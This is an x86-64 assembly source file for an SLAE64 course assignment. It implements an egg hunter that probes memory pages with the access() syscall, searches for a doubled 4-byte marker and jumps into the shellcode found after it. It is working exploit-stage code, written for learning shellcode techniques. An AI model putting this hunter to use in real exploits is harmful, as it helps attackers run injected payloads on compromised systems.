; Author: Guillem Alminyana
; Student ID: PA-14628
; SLAE64 Assignment #3
; =====================================
;
; Compile: 
;   nasm -f elf64 EggHunterV2.nasm -o EggHunterV2.o 

global _start

section .text

EGG equ ''

_start:

	xor rdx, rdx		; Pointer to memory positions

next_mem_page:

	or dx, 0xfff		; 0xfff == 4095. To jump next page

next_mem_position:

	inc rdx					; Two uses: 
							; 	1) Next memory position when checking memory positions into a page
							;	2) Place pointer at the first byte of a memory page
	lea rdi, [rdx + 8]		; Shellcode position

	;mov rax, 0x15			; Syscall number for access()
	push 21
	pop rax
	xor rsi, rsi
	syscall					; Test if memory position is accessible
							;   RDI -> Address to check
							;   RSI -> 0

	cmp al, 0xf2			; EFAULT?
	jz next_mem_page		; Yes, then check next page

	;mov rax, EGG			; Page accessible, let's check if we find the egg
	push "kaki"				; This is the egg value. 4 bytes
	pop rax

	;mov rdi, rdx			; Put in RDI the memory position to check if has the egg 
	push rdx
	pop rdi

	scasd					; We compare. scasd increments RDI
	jnz next_mem_position	; Not found the egg, jump to next memory position in the page
	scasd					; Found 4 bytes of the egg, let's check if next 4 byte also have the egg
	jnz next_mem_position	; Not found second egg, jump again to check next memory position
	
	jmp rdi					; EGG found. Jump to execute it's shellcode. 
							; The RDI already pointing to the start of the shellcode due scasd increments
	


	
	






























